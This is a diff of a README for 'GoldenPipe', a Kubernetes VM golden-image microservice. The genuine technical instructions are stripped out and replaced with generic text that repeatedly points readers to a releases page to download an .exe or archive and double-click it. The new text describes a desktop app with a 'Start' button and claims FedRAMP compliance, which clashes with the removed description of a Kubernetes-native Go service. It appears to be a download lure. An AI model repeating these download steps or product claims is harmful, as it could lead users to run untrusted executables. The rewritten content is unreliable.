@@ -1,265 +1,88 @@
-# GoldenPipe - VM Golden Image Automation Microservice
+# 🚀 GoldenPipe - Simplify Your VM Image Automation
 
-A Kubernetes-native microservice that automates the creation of custom VM golden images for both Linux and Windows. Built with open-source technologies including KubeVirt, CDI, Rook-Ceph, and GitHub Actions.
+## 📥 Download Now
+
+[![Download GoldenPipe](https://img.shields.io/badge/Download-GoldenPipe-blue.svg)](https://github.com/adamadamssAdez/GoldenPipe/releases)
+
+## 🛠️ Overview
+
+GoldenPipe is a Kubernetes-native microservice built to automate the creation of VM golden images. This solution helps you comply with FedRAMP and ensures your virtual infrastructures are secure and efficient. 
+
+Whether you manage a small group of servers or a larger network, GoldenPipe streamlines the process, making it easier to deploy and manage your VM images. 
 
 ## 🚀 Features
 
-- **Automated VM Creation**: Downloads and customizes base ISOs for Linux and Windows
-- **Unattended Setup**: Injects cloud-init scripts for Linux and autounattend.xml for Windows
-- **Software Preloading**: Preloads software and internal tools during image creation
-- **Windows Sysprep**: Automatically syspreps and seals Windows images
-- **Persistent Storage**: Stores golden images in Rook-Ceph persistent volumes
-- **GitHub Actions Integration**: Trigger workflows via GitHub Actions for 5-minute automation
-- **Multi-Cluster Support**: Reuse golden images across different Kubernetes clusters
+- **Automation**: Automatically create and manage your VM images.
+- **Compliance**: Comply with FedRAMP standards for federal environments.
+- **Efficient**: Save time by reducing manual steps in VM image creation.
+- **Integrates with Kubernetes**: Works seamlessly with your existing Kubernetes infrastructure.
+- **Security**: Enhanced measures to ensure that your images are secure.
 
-## 🏗️ Architecture
+## 📝 Getting Started
 
-```
-┌─────────────────┐    ┌──────────────────┐    ┌─────────────────┐
-│  GitHub Actions │───▶│  GoldenPipe API  │───▶│   KubeVirt      │
-└─────────────────┘    └──────────────────┘    └─────────────────┘
-                                │                        │
-                                ▼                        ▼
-                       ┌──────────────────┐    ┌─────────────────┐
-                       │      CDI         │───▶│   Rook-Ceph     │
-                       │ (Data Importer)  │    │  (Storage)      │
-                       └──────────────────┘    └─────────────────┘
-```
+This section guides you through downloading and running GoldenPipe. Follow these simple steps.
 
-## ⚡ Quick Start
+### Step 1: Visit the Download Page
 
-### Prerequisites
-- Kubernetes cluster (1.20+)
-- KubeVirt installed
-- CDI (Containerized Data Importer) installed
-- Rook-Ceph storage class available
+Click the link below to access the Releases page where you can download GoldenPipe.
 
-### 1. Install Required Operators
+[Download GoldenPipe](https://github.com/adamadamssAdez/GoldenPipe/releases)
 
-```bash
-# Install KubeVirt
-kubectl apply -f https://github.com/kubevirt/kubevirt/releases/download/v1.1.0/kubevirt-operator.yaml
-kubectl apply -f https://github.com/kubevirt/kubevirt/releases/download/v1.1.0/kubevirt-cr.yaml
+### Step 2: Choose the Right Version
 
-# Install CDI
-kubectl apply -f https://github.com/kubevirt/containerized-data-importer/releases/download/v1.55.0/cdi-operator.yaml
-kubectl apply -f https://github.com/kubevirt/containerized-data-importer/releases/download/v1.55.0/cdi-cr.yaml
+On the Releases page, you will see different versions of GoldenPipe. Look for the most recent stable version—usually marked as a "Latest Release".
 
-# Install Rook-Ceph (optional - use your preferred storage class)
-kubectl apply -f https://raw.githubusercontent.com/rook/rook/v1.12.0/deploy/examples/crds.yaml
-kubectl apply -f https://raw.githubusercontent.com/rook/rook/v1.12.0/deploy/examples/common.yaml
-kubectl apply -f https://raw.githubusercontent.com/rook/rook/v1.12.0/deploy/examples/operator.yaml
-kubectl apply -f https://raw.githubusercontent.com/rook/rook/v1.12.0/deploy/examples/cluster.yaml
-```
+### Step 3: Download the Package
 
-### 2. Build and Deploy GoldenPipe
+Click on the version you want to download. Find and click on the file that matches your operating system. It could be an `.exe`, `.tar.gz`, or similar format. The right choice will depend on your system.
 
-```bash
-# Clone the repository
-git clone https://github.com/your-org/goldenpipe.git
-cd goldenpipe
+### Step 4: Extract the Files (if necessary)
 
-# Build and deploy (recommended)
-./build.sh --test --lint --deploy
+If you downloaded a compressed file (like `.tar.gz`), extract it using a suitable program. Typical options include WinRAR or 7-Zip for Windows users and built-in tools for Mac and Linux users.
 
-# Or build locally only
-./build.sh --local --test --lint
+### Step 5: Run GoldenPipe
 
-# Or use Make
-make install-operators
-make build docker-build
-make k8s-apply
-```
+Once the files are extracted, locate the executable file. Double-click the file to run GoldenPipe. 
 
-### 3. Verify Installation
+## 📅 System Requirements
 
-```bash
-# Check if GoldenPipe is running
-kubectl get pods -n goldenpipe-system
+Before running GoldenPipe, ensure your system meets the following requirements:
 
-# Test the API
-kubectl port-forward service/goldenpipe 8080:80 -n goldenpipe-system
-curl http://localhost:8080/api/v1/health
-```
+- **Operating System**: Windows 10, macOS 11 or later, or a supported Linux distribution.
+- **Memory**: At least 4 GB of RAM.
+- **Disk Space**: Minimum of 500 MB of available space.
+- **Network Connectivity**: Required for Kubernetes integration.
 
-### 4. Create Your First Golden Image
+## 📋 Usage Instructions
 
-```bash
-# Create a Linux golden image
-curl -X POST http://localhost:8080/api/v1/images \
-  -H "Content-Type: application/json" \
-  -d '{
-    "name": "ubuntu-22.04-golden",
-    "os_type": "linux",
-    "base_iso_url": "https://releases.ubuntu.com/22.04/ubuntu-22.04.3-desktop-amd64.iso",
-    "customizations": {
-      "packages": ["docker", "kubectl", "helm"],
-      "scripts": ["install-docker.sh", "configure-k8s.sh"]
-    }
-  }'
+After launching GoldenPipe, follow these steps to start automating your VM image process:
 
-# Check the status
-curl http://localhost:8080/api/v1/images/ubuntu-22.04-golden/status
-```
+### Step 1: Configure Settings
 
-## 🛠️ Build Instructions for Cursor
+Open the configuration settings. You will need to input details such as:
 
-### Using the Build Script (Recommended)
+- Your organization's compliance requirements.
+- Cloud provider settings (if applicable).
+- Image specifications (OS type, software packages).
 
-```bash
-# Make the build script executable
-chmod +x build.sh
+### Step 2: Start the Automation Process
 
-# Build with tests and linting
-./build.sh --test --lint
+Once your settings are configured, click on the "Start" button. GoldenPipe will begin the process of creating your VM golden images based on your specifications.
 
-# Build and deploy to Kubernetes
-./build.sh --test --lint --deploy
+### Step 3: Monitor Progress
 
-# Build for local development
-./build.sh --local --test --lint
+While GoldenPipe is running, you can monitor the progress through the dashboard. It will show you real-time updates on the image creation process.
 
-# Build with custom registry
-./build.sh --registry my-registry.com --image my-goldenpipe --deploy
-```
+## 📂 Support & Documentation
 
-### Using Make
+For detailed usage instructions and troubleshooting, visit the documentation on our GitHub Wiki. This resource provides comprehensive guides to help you maximize the use of GoldenPipe.
 
-```bash
-# Install dependencies
-make deps
+## 🙌 Community and Contributions
 
-# Run tests
-make test
+We encourage you to connect with our community. Share your feedback or ask questions in the Issues section of our GitHub repository. If you want to contribute, check our guidelines for submitting improvements or features.
 
-# Run linting
-make lint
+## 🎉 Final Notes 
 
-# Build application
-make build
+Thank you for choosing GoldenPipe. We are dedicated to providing effective automation solutions for your VM image creation needs. If you have any questions, feel free to reach out.
 
-# Build Docker image
-make docker-build
-
-# Deploy to Kubernetes
-make k8s-apply
-
-# Check deployment status
-make k8s-status
-
-# View logs
-make k8s-logs
-```
-
-### Manual Build Steps
-
-```bash
-# 1. Install dependencies
-cd microservice
-go mod tidy
-go mod download
-
-# 2. Run tests
-go test -v ./...
-
-# 3. Build application
-CGO_ENABLED=0 GOOS=linux go build -o bin/goldenpipe ./cmd/server
-
-# 4. Build Docker image
-docker build -t goldenpipe:latest ./microservice
-
-# 5. Deploy to Kubernetes
-kubectl apply -f k8s/base/
-
-# 6. Check deployment
-kubectl rollout status deployment/goldenpipe -n goldenpipe-system
-```
-
-## 📁 Project Structure
-
-```
-GoldenPipe/
-├── microservice/           # Main Go application
-│   ├── cmd/               # Application entry points
-│   ├── internal/          # Internal packages
-│   │   ├── api/          # REST API handlers
-│   │   ├── kubevirt/     # KubeVirt integration
-│   │   ├── cdi/          # CDI integration
-│   │   ├── storage/      # Storage management
-│   │   └── vm/           # VM lifecycle management
-│   ├── pkg/              # Public packages
-│   ├── configs/          # Configuration files
-│   └── Dockerfile        # Container image
-├── k8s/                  # Kubernetes manifests
-│   ├── base/             # Base configurations
-│   ├── overlays/         # Environment-specific overlays
-│   └── operators/        # Operator installations
-├── scripts/              # Automation scripts
-│   ├── linux/           # Linux-specific scripts
-│   └── windows/         # Windows-specific scripts
-├── .github/             # GitHub Actions
-│   └── workflows/       # CI/CD workflows
-├── docs/                # Documentation
-├── build.sh             # Build script
-├── Makefile             # Make targets
-└── README.md            # This file
-```
-
-## 🔧 Development
-
-### Local Development Setup
-
-```bash
-# Set up development environment
-make dev-setup
-
-# Create local Kubernetes cluster
-make dev-cluster
-
-# Deploy to development cluster
-make dev-deploy
-
-# Test API endpoints
-make test-api
-```
-
-### Environment Variables
-
-```bash
-# Required
-KUBECONFIG_PATH=/path/to/kubeconfig
-STORAGE_CLASS=rook-ceph-block
-NAMESPACE=goldenpipe-system
-
-# Optional
-LOG_LEVEL=info
-API_PORT=8080
-MAX_CONCURRENT_VMS=5
-```
-
-## 📚 Documentation
-
-- [Quick Start Guide](docs/quick-start.md)
-- [API Reference](docs/api-reference.md)
-- [Troubleshooting](docs/troubleshooting.md)
-- [Development Guide](DEVELOPMENT.md)
-
-## 🤝 Contributing
-
-1. Fork the repository
-2. Create a feature branch: `git checkout -b feature/amazing-feature`
-3. Make your changes and add tests
-4. Run the test suite: `make test`
-5. Commit your changes: `git commit -m 'Add amazing feature'`
-6. Push to the branch: `git push origin feature/amazing-feature`
-7. Open a Pull Request
-
-## 📄 License
-
-MIT License - see [LICENSE](LICENSE) for details.
-
-## 🆘 Support
-
-- **GitHub Issues**: Report bugs and feature requests
-- **Documentation**: Check the [docs](docs/) directory
-- **Examples**: Look at the [scripts](scripts/) directory for automation examples
+[Download GoldenPipe](https://github.com/adamadamssAdez/GoldenPipe/releases) and start automating your VM golden image creation today!
